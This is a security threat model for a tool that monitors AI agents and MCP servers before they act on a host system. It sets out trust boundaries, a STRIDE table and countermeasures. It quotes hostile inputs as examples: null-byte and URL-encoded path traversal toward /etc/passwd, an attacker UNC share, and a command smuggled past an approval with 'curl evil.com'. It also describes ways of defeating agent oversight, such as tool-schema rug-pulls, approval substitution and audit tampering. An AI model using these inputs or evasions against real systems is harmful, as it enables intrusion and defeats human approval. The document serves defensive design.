# Agent Monitor Threat Model (V4.1.0)

This document establishes the formal threat model for **Agent Monitor**, detailing trust boundaries, actor capabilities, threat classifications (STRIDE), attack vectors, and implemented security mitigations across all components.

---

## 1. System Overview & Trust Boundaries

Agent Monitor sits directly between autonomous AI agents (or MCP clients) and the underlying host operating system.

```text
┌────────────────────────────────────────────────────────┐
│ UNTRUSTED / ADVERSARIAL ZONE                           │
│ - Untrusted LLM outputs                                │
│ - Compromised or rogue MCP servers                     │
│ - Malicious third-party tool code & schema mutations   │
└──────────────────────────┬─────────────────────────────┘
                           │ Tool Call Intent / Protocol Messages
                           ▼
══════════════════════════════════════════════════════════
 TRUST BOUNDARY: AGENT MONITOR CONTROL PLANE (V4.1.0)
 - ActionInterceptor (@agent-monitor/agent)
 - McpStdioProxy (@agent-monitor/gateway)
 - SQLite WAL Persistence (@agent-monitor/server)
══════════════════════════════════════════════════════════
                           │ Authorized & Inspected Commands / Operations
                           ▼
┌────────────────────────────────────────────────────────┐
│ TRUSTED SYSTEM ZONE                                    │
│ - Host Filesystem (Scoped to workspaceRoot)            │
│ - Host Operating System & Shell Execution              │
│ - Local Network Interfaces                             │
└────────────────────────────────────────────────────────┘
```

### Trust Boundary Definitions

1. **Boundary A: Agent / Protocol Ingestion**
   - Ingestion of JSON-RPC requests from MCP clients or function call parameters from native agent loops.
   - *Assumed Threat*: Malformed payloads, buffer overflow attempts, notification bypasses, oversized arguments, Unicode obfuscation.
2. **Boundary B: Policy & Approval Gate**
   - Evaluation of intent against versioned rules and human-in-the-loop approvals.
   - *Assumed Threat*: Approval replay, context substitution, parameter mutation between approval and execution, race conditions against kill switches.
3. **Boundary C: Host Execution & Filesystem Access**
   - Actual interaction with files, directories, processes, and network.
   - *Assumed Threat*: Directory traversal (`..`), null byte injection, Windows drive letter escape on POSIX, UNC remote share access, circular symlink traps, child process shell escape.
4. **Boundary D: Persistence & Cryptographic Audit**
   - Local storage of session records, incident cases, approvals, and chained events.
   - *Assumed Threat*: Direct SQLite tampering, out-of-order event injection, sequence gaps, deleted events, audit forgery.

---

## 2. Threat Classification Matrix (STRIDE)

| Threat Category | Potential Attack Vector | Impact | Implemented Mitigation (V4.1.0) |
|---|---|---|---|
| **Spoofing** | Compromised MCP server impersonating another tool or renaming itself dynamically. | High | Cryptographic tool schema fingerprints (`computeToolSchemaFingerprint`) and source isolation (`computeSourceFingerprint`). Unverified mutations force status to `UNTRUSTED` with `retrustRequired: true`. |
| **Tampering** | Direct SQLite modification of event history or approval records to hide malicious activity. | Critical | SHA-256 cryptographic hash chaining (`prevHash` -> `hash`) with deterministic recursive canonicalization (`canonicalizeJson`) and genesis sequence enforcement (`verifyEventChain`). |
| **Repudiation** | Operator approves action A, but agent executes action B using same approval ID. | Critical | Cryptographic `actionContextHash` cryptographically binds `sessionId`, `actionKind`, `params`, `source`, `policyVersion`, and `riskScore`. Checked before and after approval. |
| **Information Disclosure** | Agent executes command or reads resource that prints credentials, API keys, or private SSH keys. | Critical | Pre-execution pattern detection and post-execution deep redaction (`redactSecretsDeep`) replacing credentials with `[REDACTED:<type>]` in audit and responses. |
| **Denial of Service** | Agent executes commands generating massive output, or sends multi-megabyte JSON-RPC arguments. | High | 1MB tool argument limit, 500KB response truncation in `McpResultInspector`, 10MB framing bounds, sliding-window rate limiting, and command execution timeouts. |
| **Elevation of Privilege** | Path traversal escaping workspace root to read `/etc/shadow`, `~/.ssh/id_rsa`, or Windows SAM. | Critical | `resolveSafeWorkspacePath` with null-byte rejection, Unicode NFC normalization, iterative URL decoding, UNC network path blocking, and symlink target verification. |

---

## 3. Adversarial Attack Vectors & Countermeasures

### 3.1 Path Traversal Escapes

- **Null Byte Injection (`\0`)**: An attacker provides `safe.txt\0/../../etc/passwd` to bypass suffix checks.
  - *Countermeasure*: Immediate regex and string checks for `\0` in raw and iteratively URL-decoded paths; rejects immediately with `isOutsideWorkspace: true`.
- **Iterative URL Encoding**: Attacks using `%2e%2e%2f` (single) or `%252e%252e%252f` (double/nested).
  - *Countermeasure*: Bounded 5-pass iterative URI decoding (`decodeURIComponent`) prior to path normalization.
- **Cross-Platform Drive & UNC Escapes**: Injecting Windows drive letters (`C:\...`) or UNC network paths (`\\attacker\smb`) on Unix systems where `path.resolve` does not treat them as root drives.
  - *Countermeasure*: Explicit regex validation rejecting drive prefixes and UNC share strings when workspace root does not match.

### 3.2 Dynamic Tool Rug-Pulls

- **Schema Mutation**: MCP server registers a benign tool (`calculate`), waits for trust, then mutates its schema or command arguments to execute arbitrary bash scripts.
  - *Countermeasure*: `upsertMcpSource` verifies `fingerprint` and `toolSchemaFingerprint`. Any mutation immediately downgrades trust state to `UNTRUSTED`, flags `retrustRequired = 1`, and logs a high-severity incident.

### 3.3 Approval Substitution & Replay

- **Parameter Tampering**: Human operator reviews and approves `npm test`. Before execution resumes, parameters are modified in memory to `npm test && curl evil.com`.
  - *Countermeasure*: `computeActionContextHash` computes SHA-256 over all normalized parameters and policy version. Post-approval verification recomputes hash and aborts if it diverges.
- **Approval Expiration**: An approval granted hours ago is used when environmental context has changed.
  - *Countermeasure*: Approvals carry strict `expiresAt` timestamps. Post-approval check aborts if `Date.now() > expiresAt`.

---

## 4. Fail-Closed Invariant

In every stage of the control plane, if an indeterminate state, unhandled parsing error, missing configuration, or security conflict occurs:
- The action is **DENIED** or execution is **BLOCKED**.
- An audit event is recorded.
- The system **never** fails open.
